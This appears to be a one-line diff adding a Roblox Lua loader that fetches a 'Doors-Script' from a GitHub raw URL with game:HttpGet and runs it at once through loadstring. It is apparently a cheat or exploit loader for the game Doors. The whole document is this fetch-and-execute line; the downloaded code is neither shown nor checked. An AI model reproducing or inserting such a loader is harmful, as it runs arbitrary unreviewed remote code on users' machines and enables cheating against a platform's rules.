@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nixirbx/Doors-Script/refs/heads/main/By-Nixi"))()
